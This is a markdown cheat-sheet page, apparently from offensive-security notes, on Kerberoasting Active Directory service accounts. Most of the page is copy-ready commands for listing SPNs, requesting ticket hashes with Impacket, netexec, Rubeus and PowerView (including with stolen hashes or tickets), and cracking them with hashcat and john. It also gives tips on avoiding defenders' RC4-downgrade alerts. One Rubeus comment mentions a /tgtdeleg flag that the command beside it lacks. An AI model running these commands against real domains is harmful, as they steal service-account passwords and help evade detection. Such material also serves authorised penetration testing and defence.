---
title: "Kerberoasting"
---

# Kerberoasting

> Request service tickets (TGS) for accounts that expose an SPN, then crack their key offline to recover the service account's password.

## 🧠 Theory

Kerberoasting targets **accounts with a Service Principal Name** (`servicePrincipalName`) -
typically service accounts (SQL, IIS, custom apps).

- Any user holding a valid **TGT** can request a **TGS for any SPN** - the KDC does not
  check whether the requester is allowed to use the service.
- The returned TGS is encrypted with the **service account's key**, so its password can be
  cracked offline - no interaction with the service, no lockout.
- Service accounts often have **weak, non-expiring** passwords, which is what makes this so
  reliable.

> [!tip] RC4 vs AES
> RC4 tickets (etype 23, `hashcat -m 13100`) crack far faster than AES (`-m 19700`), so
> tools request RC4 when possible. Forcing RC4 on an AES-capable account is a known
> **downgrade** that defenders alert on - prefer `/rc4opsec` (Rubeus) to only roast
> accounts that genuinely still accept RC4.

## Exploit

### Linux (Impacket / netexec)

::: code-group

```bash [GetUserSPNs]
# List kerberoastable SPNs (no ticket requested yet - quiet recon)
impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP

# Request every TGS and save the crackable hashes
impacket-GetUserSPNs -request $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -outputfile kerberoast.txt

# Target a single account - one ticket request, minimal footprint
impacket-GetUserSPNs -request-user $TARGET_USER $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -outputfile kerberoast.txt
```

```bash [PtH / PtT]
# Pass-the-hash
impacket-GetUserSPNs -request -hashes :$NT_HASH $DOMAIN/$USER -dc-ip $DC_IP -outputfile kerberoast.txt

# Pass-the-ticket (KRB5CCNAME already set)
impacket-GetUserSPNs -request -k -no-pass $DOMAIN/$USER -dc-ip $DC_IP -outputfile kerberoast.txt
```

```bash [netexec]
# Enumerate + roast in one pass, hashes written to a file
nxc ldap $DC_IP -u $USER -p $PASSWORD --kerberoasting kerberoast.txt
nxc ldap $DC_IP -u $USER -H $NT_HASH --kerberoasting kerberoast.txt     # with an NT hash
```

:::

### Windows (Rubeus / PowerView)

::: code-group

```powershell [Rubeus]
# /rc4opsec only roasts accounts still accepting RC4 (avoids the AES->RC4 downgrade alert)
Rubeus.exe kerberoast /rc4opsec /nowrap

# Target one account; /tgtdeleg requests the ticket without the plaintext password
Rubeus.exe kerberoast /user:$TARGET_USER /nowrap
```

```powershell [PowerView]
# Discover SPNs
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Request and export the hash for a specific account
Get-DomainSPNTicket -SPN "MSSQLSvc/sql.$DOMAIN:1433" -OutputFormat Hashcat
```

```cmd [setspn]
:: Native SPN discovery, no tooling dropped
setspn -T $DOMAIN -Q */*
```

:::

## Cracking

```bash
hashcat -m 13100 kerberoast.txt rockyou.txt        # RC4 (etype 23)
hashcat -m 19700 kerberoast.txt rockyou.txt        # AES256 (etype 18)

john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt
```

## Resources

- [TheHackerRecipes - Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoasting)
- [Kerberoast Overview (adsecurity)](https://adsecurity.org/?p=3458)
- [hashcat - example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
